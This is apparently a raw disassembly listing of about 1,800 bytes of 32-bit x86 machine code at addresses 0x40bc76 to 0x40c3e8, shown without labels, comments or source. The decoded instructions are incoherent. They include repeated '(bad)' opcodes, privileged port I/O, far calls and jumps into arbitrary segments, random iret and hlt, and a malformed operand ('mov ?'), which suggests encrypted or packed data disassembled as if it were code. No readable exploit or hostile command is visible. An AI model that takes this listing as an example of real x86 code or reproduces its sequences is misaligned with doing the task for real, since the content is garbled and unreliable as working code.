  40bc76:	shr    DWORD PTR [ecx],1
  40bc78:	(bad)  
  40bc79:	std    
  40bc7a:	jmp    0x25c8:0xbf6b4376
  40bc81:	mov    al,BYTE PTR [esi]
  40bc83:	jp     0x40bd03
  40bc85:	xor    dh,BYTE PTR [ecx+0x1f]
  40bc88:	out    0x9e,al
  40bc8a:	pop    edx
  40bc8b:	push   ss
  40bc8c:	pop    ds
  40bc8d:	cld    
  40bc8e:	mov    fs,ecx
  40bc90:	dec    edi
  40bc91:	sub    cl,BYTE PTR [ebx-0x3c74eb47]
  40bc97:	dec    ebp
  40bc98:	mov    bl,0xae
  40bc9a:	adc    al,0x7f
  40bc9c:	jb     0x40bce2
  40bc9e:	push   edx
  40bc9f:	cdq    
  40bca0:	shl    esp,0x2f
  40bca3:	adc    eax,0x69fb196a
  40bca8:	popa   
  40bca9:	sub    cl,BYTE PTR [edx]
  40bcab:	scas   al,BYTE PTR es:[edi]
  40bcac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bcad:	sub    al,0x95
  40bcaf:	dec    edx
  40bcb0:	xor    eax,0xe76c1407
  40bcb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bcb6:	mov    bl,0xe6
  40bcb8:	mov    dl,0xf5
  40bcba:	outs   dx,BYTE PTR ds:[esi]
  40bcbb:	out    0x88,eax
  40bcbd:	jecxz  0x40bc81
  40bcbf:	movhps QWORD PTR [esp+edx*1+0x3703b53b],xmm3
  40bcc7:	in     eax,dx
  40bcc8:	xor    al,0x68
  40bcca:	inc    edi
  40bccb:	iret   
  40bccc:	rcr    DWORD PTR [ebp+ecx*1-0xf],cl
  40bcd0:	(bad)  
  40bcd1:	push   0xb82cc003
  40bcd6:	mov    ecx,0xa8764477
  40bcdb:	adc    eax,0xcedb0f74
  40bce0:	cmp    bh,0xf2
  40bce3:	mov    esp,0xf05f4cf3
  40bce8:	mov    ebp,0x7e916737
  40bced:	sub    al,0xfc
  40bcef:	aam    0x88
  40bcf1:	retf   0xc2b3
  40bcf4:	inc    esp
  40bcf5:	outs   dx,DWORD PTR ds:[esi]
  40bcf6:	pop    ss
  40bcf7:	xor    ebp,ecx
  40bcf9:	or     eax,0x7c71ac8d
  40bcfe:	mov    bl,0x5d
  40bd00:	xor    DWORD PTR [esp+ebp*1+0x7054a4f6],0x74e9fa72
  40bd0b:	pushaw 
  40bd0d:	popa   
  40bd0e:	adc    dl,dl
  40bd10:	pop    edi
  40bd11:	loop   0x40bd40
  40bd13:	cmp    BYTE PTR [esp+eiz*2+0x7e],dh
  40bd17:	mov    cl,0x41
  40bd19:	outs   dx,DWORD PTR ds:[esi]
  40bd1a:	sbb    ebp,DWORD PTR ds:0x3ae650f8
  40bd20:	pushf  
  40bd21:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  40bd23:	jo     0x40bcdd
  40bd25:	xchg   edi,eax
  40bd26:	mov    dh,0x21
  40bd28:	sbb    eax,0x1caa166d
  40bd2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bd2e:	push   ss
  40bd2f:	push   0xea944b4f
  40bd34:	inc    edx
  40bd35:	retf   0x521d
  40bd38:	push   ss
  40bd39:	fsub   DWORD PTR [edi-0xf60315d]
  40bd3f:	fs aas 
  40bd41:	dec    eax
  40bd42:	test   DWORD PTR [ecx-0x7fde5c63],esp
  40bd48:	fist   DWORD PTR [ecx]
  40bd4a:	and    BYTE PTR [ebp+0x4a39adb2],dl
  40bd50:	or     DWORD PTR [ecx-0x39f724ae],edx
  40bd56:	adc    dl,dh
  40bd58:	sbb    al,0xf9
  40bd5a:	mov    edi,0xb4da9782
  40bd5f:	call   0x4e71:0xc0286347
  40bd66:	mov    edi,0xd7814398
  40bd6b:	push   cs
  40bd6c:	push   0x18
  40bd6e:	mov    al,0xcd
  40bd70:	cwde   
  40bd71:	cmc    
  40bd72:	push   cs
  40bd73:	mov    ds:0xd0856a8d,al
  40bd78:	mov    ebp,0x91efd54b
  40bd7d:	inc    eax
  40bd7e:	mov    esp,0x302fc05b
  40bd83:	sub    eax,0xb3cbd908
  40bd88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bd89:	jecxz  0x40bd82
  40bd8b:	xchg   BYTE PTR [ebx+edi*8+0x68059695],bh
  40bd92:	xchg   DWORD PTR [ebx+0x1c78735c],ebp
  40bd98:	sar    BYTE PTR [ebp-0x6a],0xe9
  40bd9c:	mov    cl,bl
  40bd9e:	fild   QWORD PTR [eax-0x39]
  40bda1:	dec    esi
  40bda2:	push   ds
  40bda3:	inc    esp
  40bda4:	sub    al,0x6f
  40bda6:	or     ebx,0xd1054981
  40bdac:	jmp    0x8995:0x3e1f77d8
  40bdb3:	adc    eax,0xea6296f8
  40bdb8:	call   0xadd6aee7
  40bdbd:	rcl    BYTE PTR [edx-0x41],cl
  40bdc0:	outs   dx,DWORD PTR ds:[esi]
  40bdc1:	mov    dl,BYTE PTR [esi]
  40bdc3:	sahf   
  40bdc4:	in     al,dx
  40bdc5:	pop    ecx
  40bdc6:	jecxz  0x40be00
  40bdc8:	and    DWORD PTR [eax+0x4dc84351],ecx
  40bdce:	(bad)  
  40bdcf:	enter  0xf9f5,0xb9
  40bdd3:	mov    bl,0x1a
  40bdd5:	push   ds
  40bdd6:	loopne 0x40bde3
  40bdd8:	mov    esi,0x8e9432f
  40bddd:	push   0xffffffea
  40bddf:	nop
  40bde0:	es shl cl,cl
  40bde3:	jp     0x40bdf2
  40bde5:	pop    edi
  40bde6:	(bad)
  40bde9:	mov    dh,0x9
  40bdeb:	or     al,0xe6
  40bded:	sub    DWORD PTR [ecx+ebx*4+0x2a065459],edx
  40bdf4:	lods   eax,DWORD PTR ds:[esi]
  40bdf5:	push   eax
  40bdf6:	gs ja  0x40bd96
  40bdf9:	and    BYTE PTR [esi+0x1e9c0124],ah
  40bdff:	repnz cmp eax,edi
  40be02:	imul   ebx,DWORD PTR [ebp+0xfe08c37],0x3fc036f1
  40be0c:	mul    bh
  40be0e:	pop    esp
  40be0f:	dec    esp
  40be10:	push   0xf4d0e5cd
  40be15:	mov    cl,bh
  40be17:	imul   ecx,DWORD PTR [eax],0xe5ed82c9
  40be1d:	xchg   ecx,ebp
  40be1f:	push   ds
  40be20:	pop    edi
  40be21:	jle    0x40be5e
  40be23:	test   ebx,0xe545aa27
  40be29:	xlat   BYTE PTR ds:[ebx]
  40be2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be2b:	pop    esp
  40be2c:	out    0x3,eax
  40be2e:	es out dx,al
  40be30:	adc    esp,edx
  40be32:	push   es
  40be33:	or     ecx,edi
  40be35:	rcl    DWORD PTR [esi-0x77d5f13],0x3b
  40be3c:	pop    ecx
  40be3d:	cdq    
  40be3e:	cdq    
  40be3f:	inc    eax
  40be40:	test   al,0x97
  40be42:	and    bh,cl
  40be44:	mov    edi,DWORD PTR [esp+eiz*2-0x1563aea8]
  40be4b:	outs   dx,DWORD PTR ds:[esi]
  40be4c:	mov    bh,0x2a
  40be4e:	add    eax,0xe408ed8b
  40be53:	cmc    
  40be54:	pushf  
  40be55:	push   ss
  40be56:	xchg   edi,eax
  40be57:	stos   DWORD PTR es:[edi],eax
  40be58:	imul   eax,DWORD PTR [edi+0x78150a3f],0x53408715
  40be62:	xchg   esp,eax
  40be63:	add    DWORD PTR [esi],0x6e
  40be66:	cmp    eax,0x51e02f2
  40be6b:	cmp    DWORD PTR [edx],eax
  40be6d:	fadd   DWORD PTR [edi+0x33a29412]
  40be73:	fstcw  WORD PTR [edx+0x74]
  40be77:	lds    ebp,FWORD PTR [esi+0x4b]
  40be7a:	fst    DWORD PTR [ebx-0x31f365c8]
  40be80:	jns    0x40be91
  40be82:	pop    edx
  40be83:	xor    al,0x85
  40be85:	out    dx,al
  40be86:	je     0x40be2a
  40be88:	or     dl,BYTE PTR [edi+edi*1]
  40be8b:	inc    esp
  40be8c:	retf   0xd14
  40be8f:	rol    ebx,1
  40be91:	cmp    al,0x2c
  40be93:	cmp    DWORD PTR [edi-0x155e8f1e],esp
  40be99:	ins    BYTE PTR es:[edi],dx
  40be9a:	int    0x68
  40be9c:	push   es
  40be9d:	lock scas al,BYTE PTR es:[edi]
  40be9f:	shl    BYTE PTR [esi+0x662d7d0a],cl
  40bea5:	inc    edi
  40bea6:	cwde   
  40bea7:	shl    DWORD PTR [ecx-0x27],1
  40beaa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40beab:	shr    DWORD PTR [ebp+eax*4+0x6e1481c9],cl
  40beb2:	jno    0x40be98
  40beb4:	push   esp
  40beb5:	mov    al,0xe6
  40beb7:	sbb    BYTE PTR [edx-0x2d9dcc4d],cl
  40bebd:	jo     0x40beeb
  40bebf:	neg    DWORD PTR [edx]
  40bec1:	call   0x9d82:0xd0cf06dd
  40bec8:	retf   0xfc28
  40becb:	sahf   
  40becc:	outs   dx,BYTE PTR ds:[esi]
  40becd:	cmp    bh,BYTE PTR [ebx]
  40becf:	in     eax,dx
  40bed0:	pop    ds
  40bed1:	sbb    ebx,DWORD PTR [edx]
  40bed3:	lds    ecx,FWORD PTR [edi]
  40bed5:	pop    ebp
  40bed6:	jmp    DWORD PTR [edx-0x7a]
  40bed9:	test   al,0xbf
  40bedb:	and    ebx,esp
  40bedd:	into   
  40bede:	dec    esp
  40bedf:	ret    
  40bee0:	inc    ebp
  40bee1:	loopne 0x40beba
  40bee3:	rcr    DWORD PTR [esi],1
  40bee5:	add    dl,BYTE PTR [ecx]
  40bee7:	out    dx,eax
  40bee8:	retf   0x9beb
  40beeb:	cmp    ah,dl
  40beed:	fwait
  40beee:	adc    BYTE PTR [edi-0x6a3651cf],cl
  40bef4:	shr    eax,cl
  40bef6:	ret    
  40bef7:	outs   dx,DWORD PTR ds:[esi]
  40bef8:	mov    dl,0x96
  40befa:	sar    DWORD PTR [esi-0x7f846868],1
  40bf00:	mov    eax,ds:0x81c96dd4
  40bf05:	xchg   ecx,eax
  40bf06:	pop    eax
  40bf07:	addr16 icebp 
  40bf09:	mov    ?,WORD PTR [ebx-0x51cdbb11]
  40bf0f:	imul   edi,DWORD PTR [eax-0x23],0x8c179eb8
  40bf16:	(bad)  
  40bf17:	loope  0x40bf40
  40bf19:	shr    BYTE PTR ds:0xebd25e42,cl
  40bf1f:	ins    BYTE PTR es:[edi],dx
  40bf20:	aam    0x8d
  40bf22:	jmp    DWORD PTR [edx-0x9c7aafb]
  40bf28:	and    BYTE PTR [edx-0x50ae71ca],ah
  40bf2e:	add    cl,ch
  40bf30:	sub    al,dl
  40bf32:	xchg   edi,eax
  40bf33:	push   ds
  40bf34:	or     eax,0x6391d89e
  40bf39:	aam    0xc3
  40bf3b:	jmp    0x40bfb5
  40bf3d:	(bad)  
  40bf3f:	sbb    eax,0x523d598
  40bf44:	and    al,0xc6
  40bf46:	call   0x67f256f7
  40bf4b:	dec    ebx
  40bf4c:	mov    dh,0x8d
  40bf4e:	mov    ah,BYTE PTR [ebx+0x10513344]
  40bf54:	push   es
  40bf55:	or     ch,ch
  40bf57:	pop    esi
  40bf58:	call   0xf07b:0x25b2ed2c
  40bf5f:	shl    bh,cl
  40bf61:	adc    edi,esi
  40bf63:	pop    ds
  40bf64:	and    al,0x6c
  40bf66:	push   esi
  40bf67:	not    BYTE PTR [ecx+0x1b]
  40bf6a:	cs pop es
  40bf6c:	fsub   DWORD PTR [edx+0x45]
  40bf6f:	and    esi,DWORD PTR [edx+eiz*2-0x24a8cac9]
  40bf76:	jo     0x40bfe5
  40bf78:	xchg   ecx,eax
  40bf79:	fcmovnu st,st(7)
  40bf7b:	ret    
  40bf7c:	jl     0x40bfea
  40bf7e:	xchg   BYTE PTR [ebx-0x586c2842],bh
  40bf84:	or     BYTE PTR [edi-0x16],cl
  40bf87:	cmp    DWORD PTR ds:0x65558f6a,ecx
  40bf8d:	sbb    DWORD PTR ds:0xf87bcc31,ebp
  40bf93:	popa   
  40bf94:	jne    0x40c007
  40bf96:	cs retf 0xff0e
  40bf9a:	xor    al,0x1f
  40bf9c:	and    esp,DWORD PTR [ebp+0x60d86a5d]
  40bfa2:	dec    ecx
  40bfa3:	push   esp
  40bfa4:	hlt    
  40bfa5:	mov    dl,0x4f
  40bfa7:	inc    ebp
  40bfa8:	push   es
  40bfa9:	push   ecx
  40bfaa:	jnp    0x40bf79
  40bfac:	add    cl,BYTE PTR [edx+0x158adb48]
  40bfb2:	mov    al,ds:0xe5c7891c
  40bfb7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bfb8:	xchg   edi,eax
  40bfb9:	and    eax,esi
  40bfbb:	jmp    0x40bf8a
  40bfbd:	sub    al,0x6e
  40bfbf:	add    DWORD PTR [ebx-0x5f],ebp
  40bfc2:	inc    edi
  40bfc3:	cmc    
  40bfc4:	clc    
  40bfc5:	add    al,0xf0
  40bfc7:	imul   esp,ebp,0xec5d8c55
  40bfcd:	je     0x40c01d
  40bfcf:	(bad)  
  40bfd0:	(bad)  
  40bfd1:	xor    ah,dl
  40bfd3:	aad    0x67
  40bfd5:	retw   
  40bfd7:	xor    ecx,DWORD PTR [ebp-0x2a]
  40bfda:	pop    ebx
  40bfdb:	mov    eax,0x2e83176c
  40bfe0:	and    eax,0xcca622b1
  40bfe5:	inc    ecx
  40bfe6:	clc    
  40bfe7:	dec    sp
  40bfe9:	adc    al,0xfa
  40bfeb:	(bad)  
  40bfec:	pushf  
  40bfed:	inc    edx
  40bfee:	mov    ebp,0xb1cccec
  40bff3:	or     esp,0x28309ff
  40bff9:	arpl   WORD PTR [ecx-0x49],si
  40bffc:	sub    al,0x21
  40bffe:	inc    ecx
  40bfff:	cmp    DWORD PTR [ebp+0x1a],esi
  40c002:	and    al,0xbe
  40c004:	and    edi,DWORD PTR [ebx-0x5b]
  40c007:	sub    DWORD PTR [esi],ebx
  40c009:	ss std 
  40c00b:	sbb    BYTE PTR [esi],0xb7
  40c00e:	inc    ebp
  40c00f:	pop    esp
  40c010:	xchg   edx,eax
  40c011:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c012:	push   ebx
  40c013:	fs pop ecx
  40c015:	or     cl,BYTE PTR [edx-0x1]
  40c018:	lea    esi,[edi+esi*2]
  40c01b:	inc    edi
  40c01c:	add    eax,0x56ed4eb1
  40c021:	fidivr WORD PTR [ebp-0x78]
  40c024:	aaa    
  40c025:	inc    ecx
  40c026:	call   0x3299f962
  40c02b:	and    al,0xa0
  40c02d:	mov    ebp,0xedb18f92
  40c032:	loopne 0x40c02f
  40c034:	fstp   st(1)
  40c036:	jle    0x40c093
  40c038:	sbb    eax,0x3662a65b
  40c03d:	sbb    edi,eax
  40c03f:	fiadd  DWORD PTR [ebp+0x202f0a6]
  40c045:	inc    eax
  40c046:	mov    DWORD PTR [ebx-0x378a65a3],esp
  40c04c:	cmp    al,0x99
  40c04e:	cld    
  40c04f:	xchg   BYTE PTR [esi-0x5b1ca0b9],cl
  40c055:	lods   eax,DWORD PTR ds:[esi]
  40c056:	rcl    edi,1
  40c058:	sahf   
  40c059:	push   0x38658885
  40c05e:	call   0xe9299208
  40c063:	adc    al,BYTE PTR [ebp+0x31]
  40c066:	cmp    ebp,edi
  40c068:	push   edi
  40c069:	rcr    al,0xee
  40c06c:	push   ds
  40c06d:	test   BYTE PTR [ecx-0x4c09a204],bh
  40c073:	and    eax,0x9bed53da
  40c078:	pop    ebp
  40c079:	mov    cl,0xe4
  40c07b:	cmp    eax,0x344d61dc
  40c080:	push   edx
  40c081:	xlat   BYTE PTR ds:[ebx]
  40c082:	push   esi
  40c083:	in     eax,0xa7
  40c085:	xchg   ebp,eax
  40c086:	dec    esi
  40c087:	dec    ebx
  40c088:	sbb    al,0x2d
  40c08a:	push   esp
  40c08b:	mov    cs,WORD PTR [ecx-0x69]
  40c08e:	ja     0x40c0fa
  40c090:	daa    
  40c091:	sub    al,0x36
  40c093:	aas    
  40c094:	sub    dl,dh
  40c096:	jno    0x40c108
  40c098:	adc    ch,BYTE PTR [ebx+eax*2]
  40c09b:	setp   cl
  40c09e:	gs jecxz 0x40c058
  40c0a1:	cli    
  40c0a2:	mov    cl,cl
  40c0a4:	mov    ebp,0x6a1a060f
  40c0a9:	icebp  
  40c0aa:	sub    dh,cl
  40c0ac:	or     bh,BYTE PTR [ebx+0x22]
  40c0af:	add    cl,BYTE PTR [eax+eiz*8+0x1e]
  40c0b3:	daa    
  40c0b4:	ja     0x40c0b0
  40c0b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c0b7:	jg     0x40c115
  40c0b9:	outs   dx,BYTE PTR ds:[esi]
  40c0ba:	aam    0xd0
  40c0bc:	pushf  
  40c0bd:	sub    eax,ebx
  40c0bf:	fwait
  40c0c0:	sahf   
  40c0c1:	xchg   ebx,eax
  40c0c2:	retf   
  40c0c3:	fs mov esp,0x15bcba2a
  40c0c9:	adc    ebp,esi
  40c0cb:	ret    0xf2eb
  40c0ce:	int3   
  40c0cf:	add    edx,ecx
  40c0d1:	adc    ch,bh
  40c0d3:	push   ss
  40c0d4:	sbb    cl,BYTE PTR [ebp+0x6e]
  40c0d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c0d8:	push   edx
  40c0d9:	xor    ecx,DWORD PTR [edi+eax*4-0x59]
  40c0dd:	(bad)  
  40c0df:	push   es
  40c0e0:	xchg   ebx,eax
  40c0e1:	pusha  
  40c0e2:	pop    ecx
  40c0e3:	pop    esi
  40c0e4:	lods   al,BYTE PTR ds:[esi]
  40c0e5:	xor    DWORD PTR [edi],0x5e74b8cd
  40c0eb:	fsub   DWORD PTR [edx]
  40c0ed:	pushf  
  40c0ee:	fidivr WORD PTR [ebx+0x4d]
  40c0f1:	je     0x40c0e1
  40c0f3:	pop    edx
  40c0f4:	hlt    
  40c0f5:	sbb    esp,DWORD PTR [edi]
  40c0f7:	pop    edx
  40c0f8:	mov    esp,0xaf37f133
  40c0fd:	je     0x40c089
  40c0ff:	icebp  
  40c100:	pusha  
  40c101:	adc    BYTE PTR [ecx+0x2e97bffc],dl
  40c107:	stos   BYTE PTR es:[edi],al
  40c108:	inc    esp
  40c109:	inc    eax
  40c10a:	jp     0x40c0af
  40c10c:	pop    ebx
  40c10d:	cs mov ebp,0xa5ee4905
  40c113:	stc    
  40c114:	add    ecx,DWORD PTR [eax-0x547b49cb]
  40c11a:	sbb    ebx,DWORD PTR [ecx]
  40c11c:	pop    edi
  40c11d:	push   edx
  40c11e:	jecxz  0x40c13f
  40c120:	(bad)  
  40c121:	xlat   BYTE PTR ds:[ebx]
  40c122:	push   ds
  40c123:	mov    ebp,0x7c0a6743
  40c128:	pop    ss
  40c129:	aas    
  40c12a:	cmp    edi,DWORD PTR [eax-0x7afac3e3]
  40c130:	arpl   WORD PTR [edx],sp
  40c132:	inc    ecx
  40c133:	test   eax,0x94a20d88
  40c138:	or     esp,DWORD PTR [eax+eax*1+0x5f255601]
  40c13f:	pop    es
  40c140:	call   0xbcd6:0xd332934e
  40c147:	mov    eax,DWORD PTR [ecx+ebp*8+0x10d72a6e]
  40c14e:	mov    ds:0xb45b9a1b,eax
  40c153:	out    0xbc,al
  40c155:	xlat   BYTE PTR ds:[ebx]
  40c156:	stos   DWORD PTR es:[edi],eax
  40c157:	and    eax,0x560d5d83
  40c15c:	or     eax,0xe4c2a963
  40c161:	outs   dx,DWORD PTR ds:[esi]
  40c162:	shl    DWORD PTR [ebp+0x7b],cl
  40c165:	test   al,0xaa
  40c167:	sbb    dl,BYTE PTR [esi-0x1d]
  40c16a:	icebp  
  40c16b:	retf   
  40c16c:	or     al,0x6f
  40c16e:	retf   
  40c16f:	jg     0x40c122
  40c171:	pop    es
  40c172:	xchg   ecx,eax
  40c173:	fst    st(7)
  40c175:	cmp    BYTE PTR [ebp+0x71],0x4
  40c179:	pop    es
  40c17a:	push   ss
  40c17b:	fimul  DWORD PTR [esi]
  40c17d:	dec    eax
  40c17e:	and    DWORD PTR [eax],0xffffff95
  40c181:	pop    ecx
  40c182:	retf   0x6d7d
  40c185:	in     al,dx
  40c186:	adc    edx,DWORD PTR [edx-0x16]
  40c189:	popa   
  40c18a:	rep ins DWORD PTR es:[edi],dx
  40c18c:	rcr    BYTE PTR [eax+0x5ebbbc63],0xdc
  40c193:	(bad)  
  40c194:	enter  0xac51,0x47
  40c198:	shl    esp,cl
  40c19a:	jne    0x40c1bb
  40c19c:	jae    0x40c1ba
  40c19e:	sbb    eax,0x2cd4ebd5
  40c1a3:	mov    edx,0xfeeb06ec
  40c1a8:	dec    edi
  40c1a9:	xchg   WORD PTR [eax],dx
  40c1ac:	push   esp
  40c1ad:	mov    cl,0x36
  40c1af:	push   cs
  40c1b0:	xchg   ebx,eax
  40c1b1:	dec    edx
  40c1b2:	push   0xfffffff4
  40c1b4:	cmp    dl,BYTE PTR [edx]
  40c1b6:	jecxz  0x40c214
  40c1b8:	jmp    0xfacc42a8
  40c1bd:	add    eax,0x58630e68
  40c1c2:	lds    eax,FWORD PTR [eax+0x72]
  40c1c5:	cmp    ch,bh
  40c1c7:	pop    esi
  40c1c8:	shl    ah,cl
  40c1ca:	lods   al,BYTE PTR ds:[esi]
  40c1cb:	dec    BYTE PTR [edi]
  40c1cd:	xor    eax,0x4c80410e
  40c1d2:	add    ebp,esi
  40c1d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c1d5:	test   eax,0xbcf16fcd
  40c1da:	int    0xe3
  40c1dc:	in     al,0x69
  40c1de:	ins    BYTE PTR es:[edi],dx
  40c1df:	jp     0x40c238
  40c1e1:	cdq    
  40c1e2:	cmp    DWORD PTR ds:0x14cfb57d,esi
  40c1e9:	mov    eax,ebp
  40c1eb:	stc    
  40c1ec:	cli    
  40c1ed:	test   al,0xfc
  40c1ef:	ret    0xd5de
  40c1f2:	dec    edx
  40c1f3:	rcr    ah,0xdb
  40c1f6:	sub    eax,0x5993e0a3
  40c1fb:	and    al,0x80
  40c1fd:	inc    esi
  40c1fe:	leave  
  40c1ff:	fsubr  QWORD PTR [edx-0x4]
  40c202:	xor    al,0xb2
  40c204:	cmp    ecx,esi
  40c206:	cmp    dh,BYTE PTR [eax]
  40c208:	dec    edi
  40c209:	cdq    
  40c20a:	fwait
  40c20b:	sub    bh,ch
  40c20d:	fsubr  st(0),st
  40c20f:	dec    edx
  40c210:	xlat   BYTE PTR ds:[ebx]
  40c211:	(bad)  
  40c212:	outs   dx,DWORD PTR ds:[esi]
  40c213:	push   esi
  40c214:	rcr    cl,cl
  40c216:	rcl    DWORD PTR [edx+0x4afd27b0],0xd7
  40c21d:	xchg   ecx,eax
  40c21e:	dec    ecx
  40c21f:	shl    ebx,0xc8
  40c222:	outs   dx,BYTE PTR ds:[esi]
  40c223:	xor    esi,eax
  40c225:	add    eax,0x7c43347b
  40c22a:	out    dx,al
  40c22b:	pop    eax
  40c22c:	cwde   
  40c22d:	fild   DWORD PTR [ebp-0x49]
  40c230:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c231:	fs cmp eax,0x53cbd694
  40c237:	push   ebp
  40c238:	test   al,0x7a
  40c23a:	xor    edx,DWORD PTR [ecx]
  40c23c:	aad    0xb5
  40c23e:	mov    al,0xe2
  40c240:	cmp    eax,0x6e285450
  40c245:	push   ds
  40c246:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c247:	cmp    BYTE PTR [edx],ah
  40c249:	out    0xfc,eax
  40c24b:	iret   
  40c24c:	push   0x49
  40c24e:	cli    
  40c24f:	jo     0x40c29b
  40c251:	jne    0x40c255
  40c253:	js     0x40c200
  40c255:	sbb    DWORD PTR ds:0x1c42a8d6,esi
  40c25b:	test   DWORD PTR [esp+edi*4],esp
  40c25e:	xchg   edx,eax
  40c25f:	je     0x40c2b1
  40c261:	pop    ecx
  40c262:	push   ebx
  40c263:	vaddsubpd ymm6,ymm4,ymm0
  40c267:	pop    ebx
  40c268:	les    edi,FWORD PTR [edi]
  40c26a:	fbstp  TBYTE PTR [ebx]
  40c26c:	xor    eax,0xf3972456
  40c271:	in     eax,dx
  40c272:	mov    edi,0xb80cfe69
  40c277:	out    dx,eax
  40c278:	shl    ah,0xf7
  40c27b:	stos   BYTE PTR es:[edi],al
  40c27c:	push   ebp
  40c27d:	cmp    DWORD PTR [ebp-0x919177a],esi
  40c283:	popa   
  40c284:	daa    
  40c285:	xchg   ebp,eax
  40c286:	inc    esi
  40c287:	xchg   ebx,eax
  40c288:	jno    0x40c25a
  40c28a:	pusha  
  40c28b:	retf   
  40c28c:	arpl   WORD PTR [edx-0x696cde55],cx
  40c292:	fdivr  QWORD PTR [ebx+0xc37711a]
  40c298:	lods   eax,DWORD PTR ds:[esi]
  40c299:	arpl   WORD PTR [ebx],bp
  40c29b:	nop
  40c29c:	lahf   
  40c29d:	jg     0x40c2be
  40c29f:	jecxz  0x40c253
  40c2a1:	repnz rcr DWORD PTR [edi-0x5fb565f2],1
  40c2a8:	mov    edx,0x313cc05f
  40c2ad:	jo     0x40c325
  40c2af:	fwait
  40c2b0:	jmp    0x1989162d
  40c2b5:	mov    ah,0x68
  40c2b7:	jmp    0x5a0bb662
  40c2bc:	jns    0x40c27c
  40c2be:	jp     0x40c2fe
  40c2c0:	and    esi,DWORD PTR [eax+0x8afb3b3]
  40c2c6:	push   es
  40c2c7:	jns    0x40c313
  40c2c9:	xor    ah,dl
  40c2cb:	or     eax,0xfcdb10d0
  40c2d0:	mov    edi,0x380f5ac6
  40c2d5:	dec    ecx
  40c2d6:	fst    QWORD PTR [edi+edi*1]
  40c2d9:	pop    es
  40c2da:	push   0xffffffa0
  40c2dc:	mov    edx,0xa187c9e6
  40c2e1:	mov    esp,0xb6e52729
  40c2e6:	inc    eax
  40c2e7:	jnp    0x40c349
  40c2e9:	dec    eax
  40c2ea:	cmp    BYTE PTR [esi-0x37],dl
  40c2ed:	sub    cl,BYTE PTR [ecx+ebx*1-0x73dc23d0]
  40c2f4:	and    ah,BYTE PTR [eax-0x73]
  40c2f7:	xchg   edx,eax
  40c2f8:	(bad)  
  40c2f9:	mov    al,0x34
  40c2fb:	into   
  40c2fc:	pop    edi
  40c2fd:	mov    ch,0x36
  40c2ff:	int    0x48
  40c301:	shl    BYTE PTR [esi],0xb7
  40c304:	jge    0x40c35d
  40c306:	add    al,BYTE PTR [edx-0x6eeff97e]
  40c30c:	push   ss
  40c30d:	sub    ebp,DWORD PTR [esi+eiz*1+0x3f67dfc0]
  40c314:	mov    esp,0x445f55f9
  40c319:	shl    dh,1
  40c31b:	les    esp,FWORD PTR [edi+0x56]
  40c31e:	mov    ebx,0x674d44e3
  40c323:	and    al,0x83
  40c325:	cmc    
  40c326:	shl    DWORD PTR [ecx],1
  40c328:	jecxz  0x40c389
  40c32a:	pop    eax
  40c32b:	lods   eax,DWORD PTR ds:[esi]
  40c32c:	cli    
  40c32d:	and    dh,dh
  40c32f:	add    esp,DWORD PTR [eax-0x53]
  40c332:	inc    ebp
  40c333:	push   edx
  40c334:	dec    esi
  40c335:	push   ebp
  40c336:	rcl    BYTE PTR [ecx],0x48
  40c339:	sub    BYTE PTR [eax+0x6aa8ac02],bl
  40c33f:	and    al,0xbd
  40c341:	xor    DWORD PTR [eax+0x7],esp
  40c344:	add    eax,DWORD PTR [ebx+ebp*8+0x15]
  40c348:	pop    ebx
  40c349:	push   edi
  40c34a:	mov    cl,0xab
  40c34c:	call   FWORD PTR [ebp+0x6f794d04]
  40c352:	add    eax,0x7953e762
  40c357:	xlat   BYTE PTR ds:[ebx]
  40c358:	sbb    esi,esp
  40c35a:	sub    dl,0x7a
  40c35d:	mov    eax,0x6bb31737
  40c362:	in     eax,0x52
  40c364:	lods   eax,DWORD PTR ds:[esi]
  40c365:	or     dh,BYTE PTR [ebx-0x7]
  40c368:	sub    al,0xfb
  40c36a:	mov    dl,0x7b
  40c36c:	retf   
  40c36d:	adc    ebp,ebp
  40c36f:	push   es
  40c370:	jo     0x40c3cc
  40c372:	dec    ebx
  40c373:	test   DWORD PTR [edi+0xc],ecx
  40c376:	jbe    0x40c34f
  40c378:	mov    ch,dl
  40c37a:	dec    esp
  40c37b:	fsubr  QWORD PTR [esi+0x16]
  40c37e:	mov    esi,0xf6eef796
  40c383:	fwait
  40c384:	ins    DWORD PTR es:[edi],dx
  40c385:	mov    gs,WORD PTR [ecx-0x7857c708]
  40c38b:	adc    edi,DWORD PTR [edi-0x1cb1bbf3]
  40c391:	test   eax,0x6ceb36ea
  40c396:	push   ebx
  40c397:	mov    eax,0xa946b174
  40c39c:	cdq    
  40c39d:	inc    esi
  40c39e:	pop    edx
  40c39f:	rol    BYTE PTR [esi+0x2864ec92],0x96
  40c3a6:	xor    esi,DWORD PTR [ebx+0x33]
  40c3a9:	std    
  40c3aa:	jl     0x40c3da
  40c3ac:	add    al,0xd8
  40c3ae:	add    al,0x81
  40c3b0:	in     eax,dx
  40c3b1:	pop    ebp
  40c3b2:	fs mov esp,0x6063b9b6
  40c3b8:	and    bl,BYTE PTR [eax+0x25168927]
  40c3be:	dec    ecx
  40c3bf:	mov    ch,BYTE PTR [esi]
  40c3c1:	in     al,dx
  40c3c2:	das    
  40c3c3:	sub    BYTE PTR [ecx*2-0x3942df48],ch
  40c3ca:	or     dh,BYTE PTR [edi+0x41]
  40c3cd:	data16 je 0x40c3a8
  40c3d0:	retf   0x2b05
  40c3d3:	dec    edi
  40c3d4:	mov    DWORD PTR [ebx-0x24],esp
  40c3d7:	rcr    BYTE PTR [edi-0x51981b0e],0xc8
  40c3de:	sbb    eax,0xb29293a1
  40c3e3:	mov    ebx,0x53ba2d6b
  40c3e8:	pop    edx
